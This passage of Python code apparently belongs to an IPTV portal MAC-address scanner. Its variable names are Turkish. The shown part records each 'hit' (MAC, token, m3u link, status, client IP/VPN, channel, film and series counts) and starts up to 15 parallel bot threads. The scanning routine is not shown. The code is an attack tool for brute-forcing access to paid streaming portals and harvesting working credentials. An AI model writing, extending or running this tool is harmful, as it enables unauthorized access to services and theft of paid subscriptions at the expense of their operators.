                                dizisayisi=str(veri.count("series_id"))

                                vpn=""
                                if not ip =="":
                                        vpn=vpnip(ip)
                                else:
                                        vpn="ɴᴏ ᴄʟɪᴇɴᴛ ɪᴘ ᴀᴅᴅʀᴇꜱꜱ"
                                livelist=""
                                vodlist=""
                                serieslist=""
                                if kanalkata=="1" or kanalkata=="2":
                                        listlink=liveurl
                                        livel=' «⭐️» '
                                        livelist=list(listlink,macs,token,livel)
                                if kanalkata=="2":
                                        listlink=vodurl
                                        livel=' «💥️» '
                                        vodlist=list(listlink,macs,token,livel)
                                        listlink=seriesurl
                                        livel=' «⚡️️» '
                                        serieslist=list(listlink,macs,token,livel)
                                hit(mac,trh,real,m3ulink,durum,vpn,livelist,vodlist,serieslist,playerapi,SN,SNENC,SNCUT,DEV,DEVENC,SG,SING,SINGENC,kanalsayisi,filmsayisi,dizisayisi)

t1 = threading.Thread(target=d1)
t2 = threading.Thread(target=d2)
t3 = threading.Thread(target=d3)
t4 = threading.Thread(target=d4)
t5 = threading.Thread(target=d5)
t6= threading.Thread(target=d6)
t7= threading.Thread(target=d7)
t8= threading.Thread(target=d8)
t9= threading.Thread(target=d9)
t10= threading.Thread(target=d10)
t11= threading.Thread(target=d11)
t12= threading.Thread(target=d12)
t13= threading.Thread(target=d13)
t14= threading.Thread(target=d14)
t15= threading.Thread(target=d15)

t1.start()

if botsay==2 or botsay==3 or botsay==4 or botsay==5 or botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 :
        t2.start()
if botsay==3 or botsay==4 or botsay==5 or botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 :
        t3.start()
if botsay==4 or botsay==5 or botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 :
        t4.start()
if botsay==5 or botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 :
        t5.start()
if botsay==6 or botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 :
        t6.start()
if botsay==7 or botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 :
        t7.start()
if botsay==8 or botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 :
        t8.start()
if botsay==9 or botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 :
        t9.start()
if botsay==10 or botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 :
        t10.start()
if botsay==11 or botsay==12 or botsay==13 or botsay==14 or botsay==15 :
        t11.start()
if botsay==12 or botsay==13 or botsay==14 or botsay==15 :
        t12.start()
if botsay==13 or botsay==14 or botsay==15 :
        t13.start()
if botsay==14 or botsay==15 :
        t14.start()
if botsay==15 :
        t15.start()

